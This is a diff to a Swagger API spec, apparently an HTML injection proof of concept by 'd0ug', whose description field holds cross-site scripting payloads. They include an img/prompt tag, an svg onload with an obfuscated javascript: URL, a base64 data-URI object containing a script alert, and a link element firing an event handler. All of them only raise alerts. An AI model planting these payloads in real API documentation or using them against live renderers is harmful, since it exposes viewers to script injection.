@@ -2,14 +2,17 @@ swagger: '2.0'
 info:
   version: 1.0.0
   title: HTML Injection
-  description: '<div class="login-form">
+  description: '<div>
     <div class="heading">
-        <h1>HTML Injection:</h1> (PoC d0ug)
+        <h1>HTML Injection :</h1> (PoC d0ug)
     </div>
-    <div class="form-container">
-        <img src=x onerror="alert(document.domain)">
+    <div class="image">
+        <img src="x" prompt(1)>
+        <svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
+        <object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnZDB1ZycpPC9zY3JpcHQ=%2b\">
+        <link rel="canonical" oncontentvisibilityautostatechange="alert(1)" style="content-visibility:auto">
     </div>
-</div>'
+  </div>'
 paths:
   /:
     post:
